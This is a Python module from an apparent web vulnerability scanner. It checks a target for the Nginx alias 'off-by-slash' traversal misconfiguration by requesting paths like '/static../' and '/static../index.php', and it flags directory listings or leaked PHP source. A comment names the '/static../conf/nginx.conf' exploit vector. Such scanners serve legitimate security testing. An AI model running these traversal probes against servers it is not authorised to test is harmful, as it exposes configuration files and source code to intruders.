import asyncio
from modules.core import console

# Nginx Scanner (Misconfiguration)
# Focus: Alias Traversal (Off-by-slash).
# Vector: alias /var/www/html/static/; location /static { ... }
# Exploitable via: /static../conf/nginx.conf

# Common misconfigured paths
NGINX_PATHS = [
    "/static../",
    "/assets../",
    "/img../",
    "/images../",
    "/css../",
    "/js../", 
    "/media../"
]

async def check_nginx(session, url):
    try:
        # Preamble: check Server header?
        # Often removed, so we just brute force the traversal.

        for path in NGINX_PATHS:
            # Try to hit something known or list
            # /static../ should resolve to /var/www/html/static../ -> /var/www/html/
            # If autoindex is on, we see listing.
            # If not, we try to hit common files relative to the Parent.
            
            # Simple traversal check
            target = f"{url.rstrip('/')}{path}"
            
            async with session.get(target, timeout=5, ssl=False) as resp:
                text = await resp.text()
                
                # Check for Directory Listing or common file
                if "Index of" in text:
                     return {
                        "url": target,
                        "type": "Nginx Alias Traversal (Directory Listing)",
                        "evidence": "Directory listing accessed via traversal."
                    }
                
                # Try to grab a file blindly?
                # .../static../index.php (Source code?)
                # If we get source code of index.php instead of execution
                
            # Active source code check
            # If we request /static../index.php
            # It might serve /var/www/html/index.php as static file!
            target_php = f"{url.rstrip('/')}{path}index.php"
            async with session.get(target_php, timeout=5, ssl=False) as php_resp:
                if php_resp.status == 200:
                    text_php = await php_resp.text()
                    if "<?php" in text_php:
                         return {
                            "url": target_php,
                            "type": "Nginx Alias Traversal (Source Code Leak)",
                            "evidence": "PHP source code disclosed."
                        }

    except Exception:
        pass
    return None

async def scan_nginx(session, url):
    """
    Scan for Nginx Vulnerabilities.
    """
    console.print(f"\n[bold cyan]--- Nginx Scanner ---[/bold cyan]")
    
    results = []
    res = await check_nginx(session, url)
    if res:
         console.print(f"  [bold red][!] NGINX MISCONFIG: {res['url']}[/bold red]")
         console.print(f"      Status: {res['type']}")
         results.append(res)
         
    if not results:
        console.print("[dim][-] No Nginx alias traversal found.[/dim]")
        
    return results
